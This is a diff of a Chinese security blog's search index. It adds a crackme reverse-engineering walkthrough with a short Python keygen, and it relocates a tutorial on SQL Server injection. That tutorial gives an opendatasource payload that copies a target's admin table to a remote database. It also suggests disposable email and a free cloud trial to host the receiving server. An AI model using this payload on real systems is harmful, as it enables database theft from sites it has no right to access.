@@ -4,6 +4,33 @@
   
     
     <entry>
+      <title>Crackme 160-4 ajj.1 分析及注册机编写</title>
+      <link href="/2021/11/07/Crackme%20160-4%20ajj.1%20%E5%88%86%E6%9E%90%E5%8F%8A%E6%B3%A8%E5%86%8C%E6%9C%BA%E7%BC%96%E5%86%99/"/>
+      <url>/2021/11/07/Crackme%20160-4%20ajj.1%20%E5%88%86%E6%9E%90%E5%8F%8A%E6%B3%A8%E5%86%8C%E6%9C%BA%E7%BC%96%E5%86%99/</url>
+      
+        <content type="html"><![CDATA[<h2 id="Crackme-160-4-ajj-1-分析及注册机编写"><a href="#Crackme-160-4-ajj-1-分析及注册机编写" class="headerlink" title="Crackme 160-4 ajj.1 分析及注册机编写"></a><strong>Crackme 160-4 ajj.1 分析及注册机编写</strong></h2><p>这次来做crackme160的第四个。</p><a id="more"></a><hr><p>首先看一下软件界面</p><p><img src="https://i.loli.net/2021/11/07/71sP83kxrVpSuiN.jpg" alt="QQ截图20211107155601.jpg"></p><p>界面没有确定键，只能输入用户名和注册码。</p><hr><h3 id="获取基本信息"><a href="#获取基本信息" class="headerlink" title="获取基本信息"></a><strong>获取基本信息</strong></h3><p>先进行查壳，知道了这个程序是用Delphi编写的，无壳。</p><p><img src="https://i.loli.net/2021/11/07/oygS3GmUZ9IbdwE.jpg" alt="QQ截图20211107155720.jpg"></p><p>而对于使用Delphi编写的程序，可以用Darkde4获取基本信息。下图为获取的结果，结果中可以获取程序所编写的事件，那么这个chkcode的事件就看起来比较可疑，应该是程序处理注册码所用的事件。记下这个事件对应的地址，然后去Ollydbd中下一个断点。</p><p><img src="https://i.loli.net/2021/11/07/ZvHscGAihgRfqWo.jpg" alt="QQ截图20211107160035.jpg"></p><hr><h3 id="注册码生成"><a href="#注册码生成" class="headerlink" title="注册码生成"></a><strong>注册码生成</strong></h3><p>Ollydbg打开，发现有一些字符串。</p><p><img src="https://i.loli.net/2021/11/07/bIw1NQJGov4R93x.jpg" alt="QQ截图20211107165149.jpg"></p><p>把最后一个字符串输入，点击图片位置，可以发现这确实是一个注册码。所以注册码的规则是黑头Sun Brid+len(name+5)+dseloffc-012-OK+name。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">name = input(<span class="string">"name = "</span>)</span><br><span class="line">print(<span class="string">'黑头Sun Brid'</span>+str(len(name)+<span class="number">5</span>)+<span class="string">'dseloffc-012-OK'</span>+str(name))</span><br></pre></td></tr></table></figure><p><img src="https://s3.bmp.ovh/imgs/2021/11/789aa03471672519.jpg" alt=""></p>]]></content>
+      
+      
+      <categories>
+          
+          <category> 逆向工程 </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> 逆向工程 </tag>
+            
+            <tag> Crackme160 </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
       <title>Crackme 160-3 AfKayAs.2 分析及注册机编写</title>
       <link href="/2021/11/04/Crackme%20160-3%20AfKayAs.2%20%E5%88%86%E6%9E%90%E5%8F%8A%E6%B3%A8%E5%86%8C%E6%9C%BA%E7%BC%96%E5%86%99/"/>
       <url>/2021/11/04/Crackme%20160-3%20AfKayAs.2%20%E5%88%86%E6%9E%90%E5%8F%8A%E6%B3%A8%E5%86%8C%E6%9C%BA%E7%BC%96%E5%86%99/</url>
@@ -512,31 +539,6 @@
     
     
     <entry>
-      <title>SQLSever的反弹注入</title>
-      <link href="/2019/10/14/sqlsever%E5%8F%8D%E5%BC%B9%E6%B3%A8%E5%85%A5/"/>
-      <url>/2019/10/14/sqlsever%E5%8F%8D%E5%BC%B9%E6%B3%A8%E5%85%A5/</url>
-      
-        <content type="html"><![CDATA[<p>主要是利用opendatasource函数，这个函数说白了就是把在某一个数据库查询的结果传输到另一个数据库的某个表中，但是有一个限制条件，就是接受数据的表的字段数必须和查询数据的表的字段数相同。</p><p>这种注入方式适用于没有回显的，注入工具注入不进去并且过于缓慢的（所以可以说是一种骚姿势？）</p><a id="more"></a><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">insert</span> <span class="keyword">into</span> opendatasource(<span class="string">'sqloledb'</span>,<span class="string">'server=服务器;uid=登陆的用户名;pwd=登陆的密码;database=数据库名'</span>).数据库名.dbo.数据库中的表名 <span class="keyword">select</span> * <span class="keyword">from</span> <span class="keyword">admin</span><span class="comment">--</span></span><br></pre></td></tr></table></figure><blockquote><p>select * from admin –</p></blockquote><p>是可以自定义的sql语句，但是要注意在sqlsever中#不能注释，要用–才可以</p><p>这个可以说是一个小知识点，但是有要求，需要接收数据的数据库有自己的公网ip。所以可以用十分钟邮箱</p><p><a href="http://note.youdao.com/" target="_blank" rel="noopener">http://24mail.chacuo.net/</a></p><p>到香港云注册一个新账号，香港云新账号可以试用一个60天的虚拟空间，虚拟空间有公网ip和sqlsever、mysql数据库，这样就可以不本地安装了</p><p>香港云<a href="http://note.youdao.com/" target="_blank" rel="noopener">http://www.webweb.com</a></p>]]></content>
-      
-      
-      <categories>
-          
-          <category> 渗透测试 </category>
-          
-      </categories>
-      
-      
-        <tags>
-            
-            <tag> sql注入 </tag>
-            
-        </tags>
-      
-    </entry>
-    
-    
-    
-    <entry>
       <title>两数之和</title>
       <link href="/2019/10/14/%E4%B8%A4%E6%95%B0%E4%B9%8B%E5%92%8C/"/>
       <url>/2019/10/14/%E4%B8%A4%E6%95%B0%E4%B9%8B%E5%92%8C/</url>
@@ -554,6 +556,31 @@
         <tags>
             
             <tag> 两数之和 </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>SQLSever的反弹注入</title>
+      <link href="/2019/10/14/sqlsever%E5%8F%8D%E5%BC%B9%E6%B3%A8%E5%85%A5/"/>
+      <url>/2019/10/14/sqlsever%E5%8F%8D%E5%BC%B9%E6%B3%A8%E5%85%A5/</url>
+      
+        <content type="html"><![CDATA[<p>主要是利用opendatasource函数，这个函数说白了就是把在某一个数据库查询的结果传输到另一个数据库的某个表中，但是有一个限制条件，就是接受数据的表的字段数必须和查询数据的表的字段数相同。</p><p>这种注入方式适用于没有回显的，注入工具注入不进去并且过于缓慢的（所以可以说是一种骚姿势？）</p><a id="more"></a><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">insert</span> <span class="keyword">into</span> opendatasource(<span class="string">'sqloledb'</span>,<span class="string">'server=服务器;uid=登陆的用户名;pwd=登陆的密码;database=数据库名'</span>).数据库名.dbo.数据库中的表名 <span class="keyword">select</span> * <span class="keyword">from</span> <span class="keyword">admin</span><span class="comment">--</span></span><br></pre></td></tr></table></figure><blockquote><p>select * from admin –</p></blockquote><p>是可以自定义的sql语句，但是要注意在sqlsever中#不能注释，要用–才可以</p><p>这个可以说是一个小知识点，但是有要求，需要接收数据的数据库有自己的公网ip。所以可以用十分钟邮箱</p><p><a href="http://note.youdao.com/" target="_blank" rel="noopener">http://24mail.chacuo.net/</a></p><p>到香港云注册一个新账号，香港云新账号可以试用一个60天的虚拟空间，虚拟空间有公网ip和sqlsever、mysql数据库，这样就可以不本地安装了</p><p>香港云<a href="http://note.youdao.com/" target="_blank" rel="noopener">http://www.webweb.com</a></p>]]></content>
+      
+      
+      <categories>
+          
+          <category> 渗透测试 </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> sql注入 </tag>
             
         </tags>
       
